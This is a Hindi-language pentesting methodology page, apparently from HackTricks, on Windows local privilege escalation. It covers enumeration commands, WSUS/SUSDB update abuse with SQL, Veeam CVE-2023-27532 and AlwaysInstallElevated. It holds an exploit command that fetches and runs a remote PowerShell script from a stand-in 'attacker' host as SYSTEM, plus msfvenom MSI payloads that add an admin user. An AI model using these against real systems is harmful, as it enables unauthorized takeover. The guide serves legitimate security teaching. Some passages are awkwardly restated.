# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Windows local privilege escalation vectors खोजने के लिए सबसे अच्छा tool:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

यह पेज कई आधारभूत guides से Windows privilege-escalation की सामान्य methodology को एक जगह समेटता है।<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> इसका व्यावहारिक enumeration flow community workshops और checklists से भी लिया गया है।<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> ऐतिहासिक attack सामग्री में Windows privilege escalation पर DerbyCon presentation भी शामिल है।<sup>[[5]](#references)</sup>

## Windows की शुरुआती जानकारी

### Access Tokens

**अगर आपको नहीं पता कि Windows access tokens क्या होते हैं, तो आगे बढ़ने से पहले यह पेज पढ़ें:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs के बारे में अधिक जानकारी के लिए यह पेज देखें:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**अगर आपको नहीं पता कि Windows में integrity levels क्या होते हैं, तो आगे बढ़ने से पहले यह पेज पढ़ें:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Windows में कई ऐसी चीज़ें हैं जो **आपको system enumerate करने**, executables चलाने या आपकी गतिविधियों का **पता लगाने से रोक सकती हैं**। Privilege escalation enumeration शुरू करने से पहले, इन सभी **defense mechanisms** के बारे में **पढ़ें** और उन्हें **enumerate** करें:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Physical access से offline UEFI NVRAM edit को pre-boot DMA और Windows `SYSTEM` memory-patching chain में भी बदला जा सकता है:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / UIAccess silent elevation

`RAiLaunchAdminProcess` के ज़रिए launch की गई UIAccess processes का दुरुपयोग करके, AppInfo secure-path checks को bypass करने पर prompts के बिना High IL तक पहुँचा जा सकता है। UIAccess/Admin Protection bypass का समर्पित workflow यहाँ देखें:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation का दुरुपयोग करके arbitrary SYSTEM registry write (RegPwn) किया जा सकता है:<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

हाल के Windows builds में **SMB arbitrary-port** LPE path भी आया है, जिसमें privileged local NTLM authentication को फिर से उपयोग किए गए SMB TCP connection पर reflect किया जाता है:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## System Info

### Version info enumeration

जाँचें कि Windows version में कोई ज्ञात vulnerability है या नहीं (लागू किए गए patches भी जाँचें)।

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Version Exploits

यह [site](https://msrc.microsoft.com/update-guide/vulnerability) Microsoft security vulnerabilities के बारे में विस्तृत जानकारी खोजने के लिए उपयोगी है। इस database में 4,700 से अधिक security vulnerabilities हैं, जो दिखाती हैं कि Windows environment कितना **massive attack surface** प्रस्तुत करता है।

**सिस्टम पर**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas में watson शामिल है)_
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — OS build, installed updates और संभावित advisory candidates की सूची बनाता है; किसी नतीजे को लागू मानने से पहले exact product और superseding updates की पुष्टि करें।

Version-specific local exploit के लिए OS architecture के साथ-साथ **running process architecture** भी जाँचें। 64-bit Windows पर, 32-bit process पर [WOW64 file-system redirection](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector) लागू होता है: `%windir%\System32` आमतौर पर 32-bit system directory पर जाता है, जबकि `%windir%\Sysnative` उस process को native system directory तक पहुँच देता है। 64-bit process के लिए यह alias उपलब्ध नहीं होता। OS build या missing-KB candidate से exploitability साबित नहीं होती; exact issue के [Microsoft security bulletin](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) के आधार पर running build, installed या superseding update, process architecture और exploit prerequisites की तुलना करें।

Service-memory-corruption के उदाहरण के लिए, [client-controlled MIDI shared-memory ring offsets](../../binary-exploitation/array-indexing.md#client-controlled-shared-memory-ring-positions) देखें। प्रकाशित stack offsets केवल tested build पर लागू होते हैं; `LOCAL SERVICE` तक पहुँचना, बाद में [SeImpersonate/EfsPotato](roguepotato-and-printspoofer.md) के ज़रिए `SYSTEM` तक पहुँचने से अलग है।<sup>[[44]](#references)</sup>

**System information के साथ locally**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Exploits के Github repos:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

क्या env variables में कोई credential/Juicy info सेव है?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### PowerShell इतिहास

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### PowerShell Transcript फ़ाइलें

आप इसे चालू करने का तरीका यहाँ जान सकते हैं: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` केवल एक उदाहरण है। [PowerShell transcription policy](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) आम तौर पर हर उपयोगकर्ता के Documents फ़ोल्डर में लिखती है, लेकिन `OutputDirectory` सेटिंग या `Start-Transcript -OutputDirectory` फ़ाइलों को किसी साझा या छिपे हुए फ़ोल्डर में भेज सकता है। Transcript की समीक्षा करने से पहले प्रभावी आउटपुट पथ और फ़ाइल ACL जाँचें: इसमें कमांड के arguments और आउटपुट हो सकते हैं, जिनमें credentials भी शामिल हैं। पढ़ा जा सकने वाला transcript तभी सुराग है, जब उसकी सामग्री किसी उपयोगी उच्च-विशेषाधिकार वाली identity का खुलासा करती हो और वह identity संबंधित संदर्भ में log on कर सकती हो।

### PowerShell Module Logging

PowerShell pipeline के निष्पादन का विवरण रिकॉर्ड किया जाता है, जिसमें चलाए गए commands, command invocations और scripts के कुछ हिस्से शामिल हैं। हालाँकि, निष्पादन का पूरा विवरण और आउटपुट के परिणाम शायद रिकॉर्ड न हों।

इसे सक्षम करने के लिए, documentation के "Transcript files" अनुभाग में दिए निर्देशों का पालन करें और **"Powershell Transcription"** के बजाय **"Module Logging"** चुनें।

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

PowersShell logs से आखिरी 15 events देखने के लिए आप यह चला सकते हैं:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

स्क्रिप्ट के निष्पादन की पूरी गतिविधि और संपूर्ण सामग्री का रिकॉर्ड कैप्चर किया जाता है, जिससे कोड के हर ब्लॉक को चलते समय दस्तावेज़ित किया जाता है। यह प्रक्रिया प्रत्येक गतिविधि का व्यापक ऑडिट ट्रेल सुरक्षित रखती है, जो फॉरेंसिक जाँच और दुर्भावनापूर्ण व्यवहार के विश्लेषण के लिए उपयोगी है। निष्पादन के समय सभी गतिविधियों को दस्तावेज़ित करके, प्रक्रिया की विस्तृत जानकारी प्रदान की जाती है।

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Script Block के लिए logging events Windows Event Viewer में इस path पर मिलते हैं: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**।\
पिछले 20 events देखने के लिए आप यह इस्तेमाल कर सकते हैं:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### इंटरनेट सेटिंग्स

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### ड्राइव‌లు

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

पहले दिए गए निर्देशों में जोखिम का सार इस प्रकार बताया गया था:

अगर updates को http**S** के बजाय http का उपयोग करके अनुरोध किया जाता है, तो आप system को compromise कर सकते हैं।

HTTP WSUS endpoint, update-metadata interception की जांच का संकेत है। Exploitation इस बात पर भी निर्भर करता है कि client उस WSUS server का उपयोग करता है या नहीं, attacker उसके traffic को intercept या control कर सकता है या नहीं, और client की update trust तथा installation policy क्या है। केवल URL से code execution साबित नहीं होता। [Microsoft, WSUS metadata के लिए TLS की सिफारिश करता है](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

आप पहले cmd में यह चलाकर जांचते हैं कि network में non-SSL WSUS update का उपयोग होता है या नहीं:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

या PowerShell में निम्नलिखित:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

यदि आपको इनमें से कोई जवाब मिलता है:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

और यदि `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` या `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` का मान `1` है।

मूल प्रयोज्यता कथन यह था:

तब, **इसका दुरुपयोग किया जा सकता है।** यदि अंतिम registry का मान `0` है, तो WSUS एंट्री को अनदेखा किया जाएगा।

जब `UseWUServer` का मान `1` होता है, तो Windows Update कॉन्फ़िगर की गई intranet service का उपयोग करता है। यह HTTP interception path के लिए एक पूर्वापेक्षा की पुष्टि करता है, लेकिन यह साबित नहीं करता कि interception, malicious update की स्वीकृति या elevated installation संभव है। जब इसका मान `0` होता है, तो उस policy द्वारा यह विशिष्ट कॉन्फ़िगर किया गया WSUS endpoint नहीं चुना जाता।

इन vulnerabilities का दुरुपयोग करने के लिए आप [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) जैसे tools का उपयोग कर सकते हैं—ये MiTM weaponized exploit scripts हैं, जो non-SSL WSUS traffic में 'fake' updates inject करते हैं।

यहाँ research पढ़ें:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**पूरी report यहाँ पढ़ें**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
मूलतः, यह वह flaw है जिसका यह bug दुरुपयोग करता है:

> यदि हमारे पास अपने local user proxy को modify करने की अनुमति है, और Windows Updates Internet Explorer की settings में कॉन्फ़िगर किए गए proxy का उपयोग करता है, तो हम अपने asset पर अपने ही traffic को intercept करने और elevated user के रूप में code चलाने के लिए [PyWSUS](https://github.com/GoSecure/pywsus) को locally चला सकते हैं।
>
> इसके अलावा, चूँकि WSUS service वर्तमान user की settings का उपयोग करती है, इसलिए यह उसके certificate store का भी उपयोग करेगी। यदि हम WSUS hostname के लिए self-signed certificate generate करके उसे वर्तमान user के certificate store में जोड़ते हैं, तो हम HTTP और HTTPS, दोनों WSUS traffic को intercept कर पाएँगे। WSUS, certificate पर trust-on-first-use प्रकार का validation लागू करने के लिए HSTS-जैसे mechanisms का उपयोग नहीं करता। यदि प्रस्तुत certificate user द्वारा trusted है और उसका hostname सही है, तो service उसे स्वीकार कर लेगी।

इस vulnerability का दुरुपयोग करने के लिए आप tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) का उपयोग कर सकते हैं (जब यह उपलब्ध हो जाए)।

### WSUS administrator द्वारा नियंत्रित updates

एक अलग path तब मौजूद होता है जब वर्तमान identity किसी WSUS server पर updates को **publish और approve** कर सकती है। Server के `WSUS Administrators` group की effective membership और किसी भी delegated WSUS permissions की जाँच करें, फिर उस client computer group की पहचान करें जिसे approved update मिलेगा। [Microsoft updates approve करने के लिए WSUS Administrator privileges आवश्यक बताता है](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate), और [publishing के trust relationship का वर्णन करता है](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): clients को locally published content के लिए इस्तेमाल किए गए signing certificate पर trust करना होगा। इस path को privilege escalation मानने से पहले पुष्टि करें कि candidate update signed और accepted है, target पर लागू होता है, और अधिक privileged context में install होता है। अकेले HTTP `WUServer` value या group name से ये शर्तें सिद्ध नहीं होतीं।

### SUSDB custom-update का दुरुपयोग: `.txt`/`.esd` के ज़रिए unsigned payloads

यह HTTP WSUS connection को intercept करने से अलग trust-boundary failure है: इसकी पूर्वापेक्षा custom update को publish और approve करने के लिए **WSUS database (`SUSDB`) stored procedures** तक पर्याप्त access होना है। एक व्यावहारिक शुरुआती रास्ता upstream WSUS computer account को उस अलग MSSQL server तक relay करना है जो `SUSDB` host करता है; सटीक पूर्वापेक्षा deployment पर निर्भर करती है, इसलिए SQL administrator rights मानने के बजाय पहले `EXECUTE` permissions enumerate करें।<sup>[[38]](#references)[[39]](#references)</sup>

HTTP/8530 से LDAP, SMB या AD CS तक WSUS client authentication relay करने वाले अलग attack path के लिए, [Abusing WSUS HTTP for NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8) देखें।

#### External-database relay और procedure rights की पुष्टि करें

जिन deployments में WSUS external SQL Server का उपयोग करता है, उनमें पहले जाँचें कि WSUS server account database से authenticate कर सकता है या नहीं, और NTLM relay उस listener तक पहुँचता है या नहीं। Server का SQL role update-publishing procedures को उपलब्ध करा सकता है, भले ही direct table writes अस्वीकृत हों; `SUSDB` पर `UPDATE` विफल होने से यह साबित नहीं होता कि publishing अवरुद्ध है। Custom update का प्रयास करने से पहले किसी authorized SQL session में effective identity, role membership और procedure permissions की जाँच करें।<sup>[[38]](#references)</sup>

```sql
USE SUSDB;
SELECT ORIGINAL_LOGIN() AS LoginName, USER_NAME() AS DatabaseUser;
SELECT IS_ROLEMEMBER('webService') AS IsWebServiceRoleMember;
SELECT * FROM sys.fn_my_permissions('dbo.spImportUpdate', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSaveXmlFragment', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSetBatchURL', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spDeployUpdate', 'OBJECT');
```

लाइव procedure definitions और installed `SoftwareDistributionPackage.xsd`, valid update metadata को फिर से बनाने में उपयोगी हैं। Bundle parent और payload child, दोनों को `UpdateIdentity` (fragment type `1`), `LocalizedProperties` (`4`) और `ExtendedProperties` (`2`) की ज़रूरत होती है; हर `spImportUpdate` call से लौटने वाला local revision ID दर्ज करें और bundle relationship, digests, size, content URL और revision को एक-दूसरे के अनुरूप रखें। यह एक stateful publishing workflow है, इसलिए stored procedure की एक सफल call, client-side execution का प्रमाण नहीं है।<sup>[[38]](#references)</sup>

#### Update बनाएँ, target करें और approve करें

Custom-update workflow, legitimate WSUS procedures को एक restricted publishing API के रूप में इस्तेमाल करता है। महत्वपूर्ण state transitions ये हैं:<sup>[[38]](#references)</sup>

| Stage | Relevant stored procedures |
| --- | --- |
| Update metadata import करें | `spImportUpdate` |
| Prerequisite, localized और extended XML fragments store करें | `spSaveXMLFragment` |
| Content digest को attacker-controlled URL से associate करें | `spSetBatchURL` |
| Computer group की सूची बनाएँ/प्राप्त करें और client जोड़ें | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| उस group के लिए installation approve करें | `@actionID = 0` और `@isAssigned = 1` के साथ `spDeployUpdate` |

File name, digests, size और `CommandLineInstallation` handler, imported metadata/fragments में एक-दूसरे के अनुरूप होने चाहिए। Content URL और target group assign करने के बाद, अंतिम approval नीचे दिए गए जैसा होगा; उदाहरण के GUIDs को फिर से इस्तेमाल करने के बजाय नए update, group और deployment identifiers इस्तेमाल करें।<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Extension-driven signature bypass

WSUS सामान्यतः किसी भी unsigned executable content को अस्वीकार करता है। हालांकि, `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` में .NET का `VerifyFile` path, दिए गए filename का अंत `.txt` या `.esd` होने पर certificate-check flag को false पर सेट कर देता है; इसके बाद `CheckCertificateSignature` को यह साबित किए बिना छोड़ दिया जाता है कि bytes टेक्स्ट हैं या कोई वैध ESD image। इसलिए `payload.exe.txt` नाम वाला unchanged PE content verification पास कर सकता है और बाद में update के command-line installation handler द्वारा launch किया जा सकता है। यह signature forgery नहीं, बल्कि policy/type-confusion bug है।<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### BITS-compatible staging और automation

`spDeployUpdate` को कॉल करने पर WSUS पंजीकृत content फ़ेच करता है। Origin को BITS की HTTP अपेक्षाएँ पूरी करनी चाहिए: केवल ऐसा URL होना जो पहुँच योग्य हो, काफ़ी नहीं है, क्योंकि transfer में शुरुआती `HEAD`/`GET` flow और byte-range requests का उपयोग होता है। Range support के बिना server, WSUS synchronization `EventId=364` में यह संदेश देता है कि BITS को Range protocol header चाहिए।<sup>[[39]](#references)</sup>

Research PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious), import/fragment/URL/group/deployment chain के लिए आवश्यक SQL जनरेट करता है, उसे execute करने के लिए modified MSSQL client शामिल करता है, और content staging के लिए `BitsWebServer.py` उपलब्ध कराता है। अधिकृत लैब में न्यूनतम invocation यह है:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### बिना निगरानी निष्पादन और retry persistence

Client-side interaction नीति पर निर्भर करता है। `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates` में विकल्प `4 - Auto download and schedule install` होने पर, स्वीकृत update कॉन्फ़िगर किए गए शेड्यूल पर डाउनलोड और इंस्टॉल हो जाता है; उपयोगकर्ता को इसे मैन्युअल रूप से चुनने की ज़रूरत नहीं होती। परीक्षण में, जिस payload का update विफल/अधूरा रहा, callback process के बंद होते ही उसे फिर से पेश किया गया। इसलिए retry व्यवहार बार-बार होने वाली execution persistence बन सकता है; यह आसानी से दिख जाता है, क्योंकि client update-failed state दिखाता है।<sup>[[39]](#references)</sup>

#### Detection और hardening के महत्वपूर्ण बिंदु

इस chain से जुड़े उपयोगी server-side और client-side बिंदु हैं:<sup>[[39]](#references)</sup>

- `SUSDB` में `spCreateTargetGroup`, `spSetBatchURL` और `spDeployUpdate` के execution का audit करें; नए targeting groups, external content origins, `.txt`/`.esd` update payloads और अप्रत्याशित principals (खासकर non-computer accounts) द्वारा किए गए deployments की जाँच करें।
- `C:\Program Files\Update Services\LogFiles` में `ContentSyncAgent`, `FileVerified`, गलत वर्तनी वाला `FileVerficationFailed`, और `EventId=364` देखें; verification को payload extension और content magic से मिलाएँ, केवल suffix पर भरोसा न करें।
- Windows Update के बार-बार विफल होने/retry करने, और `.txt` या `.esd` नाम वाले content से PE execution या अप्रत्याशित child/network activity की तलाश करें।
- जहाँ समर्थित हो, database service के लिए Extended Protection for Authentication अनिवार्य करें और database तक network access को WSUS server तथा अधिकृत administrative systems तक सीमित रखें। Custom-update procedures पर `EXECUTE` अधिकार न्यूनतम रखें और उनका audit करें।

## Third-Party Auto-Updaters और Agent IPC (local privesc)

कई enterprise agents localhost IPC surface और privileged update channel उपलब्ध कराते हैं। यदि enrollment को attacker server की ओर मोड़ा जा सकता है और updater किसी rogue root CA या कमजोर signer checks पर भरोसा करता है, तो local user एक malicious MSI पहुँचा सकता है, जिसे SYSTEM service इंस्टॉल कर देती है। एक सामान्यीकृत technique (Netskope stAgentSvc chain – CVE-2025-0309 पर आधारित) यहाँ देखें:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (TCP 9401 के ज़रिए SYSTEM)

मूल version-specific विवरण और reconnaissance note यह थे:

Veeam B&R < `11.0.1.1261` में **TCP/9401** पर localhost service उपलब्ध होती है, जो attacker-controlled messages को process करती है और **NT AUTHORITY\SYSTEM** के रूप में arbitrary commands चलाने देती है।<sup>[[12]](#references)</sup>

- **Recon**: listener और version की पुष्टि करें, जैसे `netstat -ano | findstr 9401` और `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`।

Veeam Backup & Replication और Cloud Connect, डिफ़ॉल्ट रूप से **TCP/9401** पर core backup service का उपयोग करते हैं। [Veeam की advisory](https://www.veeam.com/kb4424) backup network perimeter के भीतर encrypted configuration-database credentials के unauthenticated disclosure का वर्णन करती है; एक अलग सार्वजनिक PoC **NT AUTHORITY\SYSTEM** के रूप में command-execution path दिखाता है।<sup>[[12]](#references)</sup> Service localhost के अलावा अन्य addresses पर भी bind हो सकती है, इसलिए उसका वास्तविक address और PID जाँचें।

- **Recon**: पुष्टि करें कि TCP/9401 `Veeam.Backup.Service.exe` से जुड़ा है, फिर इंस्टॉल किए गए product और patch metadata की जाँच करें। `netstat -ano | findstr 9401` और `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` संकेत हैं, patch की पूरी जाँच नहीं।
- **Fixed versions**: Veeam **11a build 11.0.1.1261 P20230227** और **12 build 12.0.0.1420 P20230223** को पहले fixed releases बताता है; इससे पुराने releases प्रभावित हैं। केवल चार भागों वाला file version, उन्हीं build numbers पर unpatched base build और बाद के patch में अंतर नहीं बता सकता। किसी boundary build को fixed मानने से पहले patch identifier की [vendor build history](https://www.veeam.com/kb2680) से पुष्टि करें।
- **Exploit**: आवश्यक Veeam DLLs के साथ `VeeamHax.exe` जैसे PoC को उसी directory में रखें, फिर local socket पर SYSTEM payload trigger करें:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Service, command को SYSTEM के रूप में execute करती है।

उद्धृत PoC दिखाता है कि इसकी अतिरिक्त पूर्व-आवश्यकताएँ पूरी होने पर command को SYSTEM के रूप में execute किया जा सकता है; vendor की advisory credential-disclosure issue का वर्णन करती है।

## KrbRelayUp

डिफ़ॉल्ट environment का मूल विवरण यह था:

विशिष्ट परिस्थितियों में Windows **domain** environments में **local privilege escalation** vulnerability मौजूद होती है। इन परिस्थितियों में ऐसे environments शामिल हैं जहाँ **LDAP signing लागू नहीं है,** users के पास ऐसे self-rights हैं जिनसे वे **Resource-Based Constrained Delegation (RBCD)** configure कर सकते हैं, और users domain में computers बनाने में सक्षम हैं। ध्यान दें कि ये **आवश्यकताएँ** **default settings** में पूरी होती हैं।

Local Kerberos relay, कम privilege वाले logon से privileged directory write तक पहुँच सकता है, जब कोई उपयुक्त COM server authenticate करे और relayed principal के पास target object पर अधिकार हों। [KrbRelay के दस्तावेज़](https://github.com/cube0x0/KrbRelay) RBCD और `msDS-KeyCredentialLink` (shadow-credential) LDAP writes—दोनों का वर्णन करते हैं; KrbRelayUp इनमें से कुछ paths को automate करता है। RBCD chain के लिए लागू delegation और target-object rights ज़रूरी हैं, जबकि shadow-credential chain के लिए key-credential write rights और certificate authentication path को support करने वाला KDC ज़रूरी है। इनमें से कोई भी path सिर्फ़ domain membership से उपलब्ध नहीं होता।

वास्तविक DC की [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) और [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding) policy, relayed identity का object ACL, और चुनी गई COM class के authentication और impersonation levels जाँचें। Caller का logon type और credential context भी मायने रखते हैं: WinRM session का व्यवहार interactive या new-credentials logon से अलग हो सकता है। Firewall/OXID routing और installed updates भी परिणाम बदल सकते हैं। Permissive policy या matching ACL को समीक्षा के लिए संभावित उम्मीदवार मानें; passive enumeration से COM coercion, relay authentication या directory writes शुरू नहीं होने चाहिए। Machine-account shadow credential से machine ticket मिल सकता है और, केवल तभी जब उस account के पास आवश्यक directory replication rights हों, एक अलग DCSync path भी संभव हो सकता है।

[**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) पर **exploit खोजें**

Attack के flow के बारे में अधिक जानकारी के लिए देखें [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**यदि** ये 2 registers **enabled** हैं (value **0x1** है), तो किसी भी privilege वाले users `*.msi` files को NT AUTHORITY\\**SYSTEM** के रूप में **install** (execute) कर सकते हैं।

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

यदि आपके पास meterpreter session है, तो आप इस technique को **`exploit/windows/local/always_install_elevated`** module का उपयोग करके automate कर सकते हैं।

### PowerUP

वर्तमान directory में privileges escalate करने के लिए Windows MSI binary बनाने हेतु power-up से `Write-UserAddMSI` command का उपयोग करें। यह script एक precompiled MSI installer बनाती है, जो user/group जोड़ने का prompt देती है (इसलिए आपको GIU access की आवश्यकता होगी):

```
Write-UserAddMSI
```

बनाई गई binary को चलाकर privileges escalate करें।

### MSI Wrapper

